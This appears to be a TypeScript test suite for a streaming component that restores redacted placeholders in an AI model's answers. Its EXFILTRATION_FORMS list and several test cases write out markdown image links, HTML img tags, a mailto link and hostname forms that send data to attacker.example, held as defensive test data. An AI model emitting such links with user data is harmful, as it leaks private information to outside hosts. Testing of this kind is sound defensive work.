// StreamRestorer (ADR-018): restoration of an answer that arrives in
// pieces. The promise: whatever the pieces, the streamed output is exactly
// restore() on the whole text, and at most MAX_HELD_BACK code units are held
// back at any moment. restore() is itself one push() plus end(), so the
// properties at the end also compare both against the rules written as
// regular expressions (test/support/restore-reference.ts).
//
// Values are opaque strings («card-1»), not personal data, so plain `expect`
// is safe here; properties still go through assertPropertyQuietly.

import fc from 'fast-check';
import { describe, expect, it } from 'vitest';
import { PlaceholderMapping } from '../../../src/redaction/mapping.js';
import { restore, StreamRestorer, type RestoreOptions } from '../../../src/redaction/restore.js';
import { MAX_HELD_BACK } from '../../../src/redaction/variants.js';
import { growthRatio, MAX_GROWTH_RATIO } from '../../support/linear-time.js';
import { assertPropertyQuietly } from '../../support/quiet-property.js';
import { plan, referenceRestore } from '../../support/restore-reference.js';
import { streamedAnswerArb, streamThrough, testMapping } from '../../support/restoration-text.js';

const mapping = testMapping();

/** What each push() gave back, then what end() gave back. */
function outputs(chunks: readonly string[], options?: RestoreOptions, using = mapping): string[] {
  const restorer = new StreamRestorer(using, options);
  return [...chunks.map((chunk) => restorer.push(chunk)), restorer.end()];
}

const streamed = (chunks: readonly string[], options?: RestoreOptions): string =>
  outputs(chunks, options).join('');

describe('StreamRestorer: gives back text as soon as it is decided', () => {
  it('gives back plain text at once', () => {
    const restorer = new StreamRestorer(mapping);
    expect(restorer.push('Hello world, see you')).toBe('Hello world, see you');
    expect(restorer.heldBack).toBe(0);
  });

  it('an empty piece changes nothing', () => {
    expect(outputs(['Hi ', '', '[CARD_1]', '', '!'])).toEqual(['Hi ', '', '', '', '«card-1»!', '']);
  });

  it('holds a word only while it could still become a placeholder', () => {
    // "Email" could be the start of "Email_1"; the space decides it.
    expect(outputs(['Email', ' me'])).toEqual(['', 'Email me', '']);
  });

  // Phase 2 note: [CARD_1] must never match inside [CARD_10]. That rests on
  // the greedy index and the closing "]", so "[CARD_1" waits for the next
  // character.
  it('holds "[CARD_1" until the next character arrives', () => {
    const restorer = new StreamRestorer(mapping);
    expect(restorer.push('Card: [CARD_1')).toBe('Card: ');
    expect(restorer.heldBack).toBe('[CARD_1'.length);
    expect(restorer.push('0]!') + restorer.end()).toBe('«card-10»!');
  });

  it('[CARD_1 + 0] stays as it is when only index 1 exists', () => {
    const only = new PlaceholderMapping();
    only.getOrAssign('CARD', 'k', '«card-1»');
    expect(outputs(['[CARD_1', '0] ok'], {}, only).join('')).toBe('[CARD_10] ok');
    expect(outputs(['[CARD_1', '] ok'], {}, only).join('')).toBe('«card-1» ok');
  });

  it.each([
    ['a split tag', ['[CAR', 'D_1] ok'], '«card-1» ok'],
    ['a split bare space form', ['Aadhaar', ' 1', ' ok'], '«aadhaar-1» ok'],
    ['a split bare underscore form', ['Card_', '1', ' ok'], '«card-1» ok'],
    ['more index digits', ['Card_1', '2 ok'], '«card-12» ok'],
    ['a split lowercase bracket', ['[card', ' 1', '] ok'], '«card-1» ok'],
  ])('restores %s', (_name, chunks, expected) => {
    expect(streamed(chunks)).toBe(expected);
  });

  it('a bare form glued to the text before its chunk is not restored', () => {
    expect(streamed(['x', 'CARD_1 ok'])).toBe('xCARD_1 ok');
    // Glued to an astral letter split across the chunks.
    expect(streamed(['\uD835', '\uDC00CARD_1 ok'])).toBe('\u{1D400}CARD_1 ok');
  });

  it('a bare form glued to an astral letter after it waits for both halves', () => {
    const restorer = new StreamRestorer(mapping);
    expect(restorer.push('CARD_1\uD835')).toBe('');
    expect(restorer.push('\uDC00 ok') + restorer.end()).toBe('CARD_1\u{1D400} ok');
  });

  // Bug-log 18: the search for undecided text started inside the two code
  // units kept from the previous chunk.
  it('a word glued to the text before a chunk is not held again', () => {
    expect(outputs(['0Aa', 'dhaar'])).toEqual(['0Aa', 'dhaar', '']);
  });

  it('never gives back half of a surrogate pair', () => {
    expect(outputs(['a\uD835', '\uDC00'])).toEqual(['a', '\u{1D400}', '']);
  });

  // 16 since PASSPORT, the longest tag (ADR-031); 15 with AADHAAR before.
  it('holds back at most MAX_HELD_BACK (16): a bracketed placeholder and a "."', () => {
    expect(MAX_HELD_BACK).toBe('[PASSPORT_9999].'.length);
    const restorer = new StreamRestorer(mapping);
    expect(restorer.push('Ref [PASSPORT_1234].')).toBe('Ref ');
    expect(restorer.heldBack).toBe(MAX_HELD_BACK);
    expect(restorer.push(' ok')).toBe('[PASSPORT_1234]. ok'); // index 1234 was never assigned
  });
});

describe('StreamRestorer: end of the answer', () => {
  it.each([
    ['a cut-off placeholder stays as it is', '[AADHA', '[AADHA'],
    ['a complete bare form restores', 'Ref Card_1', 'Ref «card-1»'],
    ['a bracket and "." restore (the host rule needs two characters)', '[CARD_1].', '«card-1».'],
    ['a bare space form and "." restore', 'Aadhaar 1.', '«aadhaar-1».'],
  ])('%s', (_name, text, expected) => {
    expect(streamed([text])).toBe(expected);
  });
});

describe('StreamRestorer: restoration safety across chunks', () => {
  it('the documented attack, split before the placeholder', () => {
    const chunks = ['Here you go! ![x](https://attacker.example/?d=', '[AADHAAR_1])'];
    expect(streamed(chunks)).toBe(chunks.join(''));
  });

  it('the host rule, split before the "." and before the label', () => {
    expect(streamed(['Visit Aadhaar 1', '.', 'attacker.example/'])).toBe(
      'Visit Aadhaar 1.attacker.example/',
    );
    expect(streamed(['[CARD_1]', '.', 'a'])).toBe('[CARD_1].a');
  });

  it('exact-only placeholders restore only in brackets', () => {
    expect(streamed(['[CARD_2] and CA', 'RD_2 ok'])).toBe('«card-2» and CARD_2 ok');
  });

  it('with restoration safety off, restores inside a URL too', () => {
    expect(
      streamed(['![x](https://a.example/?d=', '[AADHAAR_1])'], { restoreInUnsafeRegions: true }),
    ).toBe('![x](https://a.example/?d=«aadhaar-1»)');
  });
});

// Every exfiltration form from bugs 13 and 14, the HTML forms (whitespace
// around "=" included) and the host rule, with every placeholder form, cut
// at every position. None of them may restore anything.
const EXFILTRATION_FORMS: readonly string[] = [
  'Here you go! ![x](https://attacker.example/?d=P)',
  '![x](https://attacker.example/?q=(1)P)',
  '![x](https://attacker.example/?q=((1))P)',
  '[a]( https://attacker.example/?d=P)',
  '![x](<https://attacker.example/?d= P>)',
  '![x](\nhttps://attacker.example/?d=P)',
  '![x][ref]\n\n[ref]: <https://attacker.example/?d= P>',
  '![x][ref]\n\n[ref]: https://attacker.example/?d=P',
  '![x][ref]\n\n[ref]:\n  <https://attacker.example/?d= P>',
  '> ![x][ref]\n>\n> [ref]: <https://attacker.example/?d= P>',
  '<img src="https://attacker.example/?d= P">',
  '<img src = "//attacker.example/?d= P">',
  "<img src\t=\t'//attacker.example/?d= P'>",
  '<img src=\n"//attacker.example/?d= P">',
  '<a href="mailto:x@attacker.example?body=P">x</a>',
  'See attacker.example/?d=P now',
  'Visit P.attacker.example/',
];
const BARE_ONLY_FORMS: readonly string[] = ['Visit P-x.attacker.example/'];
const PLACEHOLDER_FORMS = ['[AADHAAR_1]', '[aadhaar 1]', 'AADHAAR_1', 'Aadhaar_1', 'Aadhaar 1'];

const exfiltrationTexts = (): string[] =>
  PLACEHOLDER_FORMS.flatMap((p) => [
    ...EXFILTRATION_FORMS.map((form) => form.replace('P', p)),
    ...(p.startsWith('[') ? [] : BARE_ONLY_FORMS.map((form) => form.replace('P', p))),
  ]);

describe('StreamRestorer: every exfiltration form, cut everywhere', () => {
  it('restore() leaves every form unchanged', () => {
    const changed = exfiltrationTexts().filter((text) => restore(text, mapping) !== text);
    expect(changed).toEqual([]);
  });

  it('cut once at every position', () => {
    const failures: string[] = [];
    for (const text of exfiltrationTexts()) {
      for (let i = 0; i <= text.length; i++) {
        if (streamed([text.slice(0, i), text.slice(i)]) !== text) failures.push(`${text} @${i}`);
      }
    }
    expect(failures).toEqual([]);
  });

  it('cut twice at every pair of positions (bracketed form)', () => {
    const failures: string[] = [];
    for (const form of EXFILTRATION_FORMS) {
      const text = form.replace('P', '[AADHAAR_1]');
      for (let i = 0; i <= text.length; i++) {
        for (let j = i; j <= text.length; j++) {
          const chunks = [text.slice(0, i), text.slice(i, j), text.slice(j)];
          if (streamed(chunks) !== text) failures.push(`${text} @${i},${j}`);
        }
      }
    }
    expect(failures).toEqual([]);
  });

  it('one code unit per chunk', () => {
    const failures = exfiltrationTexts().filter((text) => streamed([...text]) !== text);
    expect(failures).toEqual([]);
  });
});

describe('StreamRestorer: properties (ADR-018)', () => {
  it('streams exactly what restore() gives for the whole text, holding at most MAX_HELD_BACK', () => {
    assertPropertyQuietly(
      fc.property(
        streamedAnswerArb,
        ({ text, chunks }) =>
          streamThrough(new StreamRestorer(mapping), chunks, MAX_HELD_BACK) ===
          restore(text, mapping),
      ),
      { numRuns: 5_000 },
    );
  });

  it('the same, one code unit per chunk', () => {
    assertPropertyQuietly(
      fc.property(
        streamedAnswerArb,
        ({ text }) =>
          streamThrough(new StreamRestorer(mapping), text.split(''), MAX_HELD_BACK) ===
          restore(text, mapping),
      ),
      { numRuns: 2_000 },
    );
  });

  it('the same with restoration safety off', () => {
    const options = { restoreInUnsafeRegions: true };
    assertPropertyQuietly(
      fc.property(
        streamedAnswerArb,
        ({ text, chunks }) =>
          streamThrough(new StreamRestorer(mapping, options), chunks, MAX_HELD_BACK) ===
            restore(text, mapping, options) &&
          restore(text, mapping, options) === referenceRestore(text, mapping, 'oracle', options),
      ),
      { numRuns: 2_000 },
    );
  });

  it('restore() gives exactly what the rules written as regular expressions give', () => {
    assertPropertyQuietly(
      fc.property(
        streamedAnswerArb,
        ({ text }) => restore(text, mapping) === referenceRestore(text, mapping, 'oracle'),
      ),
      { numRuns: 5_000 },
    );
  });

  it('never restores a placeholder the Phase 2 rules left alone', () => {
    assertPropertyQuietly(
      fc.property(streamedAnswerArb, ({ text }) => {
        const before = plan(text, mapping, 'legacy');
        const now = plan(text, mapping, 'oracle');
        return (
          before.length === now.length &&
          now.every((candidate, i) => !candidate.restored || before[i]!.restored)
        );
      }),
      { numRuns: 5_000 },
    );
  });
});

describe('StreamRestorer: linear time', () => {
  it.each([
    ['placeholders and link syntax, in 3-unit chunks', '[CARD_1] ](< [a Card_1 '],
    ['prose, in 3-unit chunks', 'word word '],
  ])('%s', (_name, unit) => {
    const make = (n: number): string => unit.repeat(n);
    const stream = (text: string): string => {
      const restorer = new StreamRestorer(mapping);
      let out = '';
      for (let i = 0; i < text.length; i += 3) out += restorer.push(text.slice(i, i + 3));
      return out + restorer.end();
    };
    expect(growthRatio(make, 2_000, stream)).toBeLessThan(MAX_GROWTH_RATIO);
  });
});
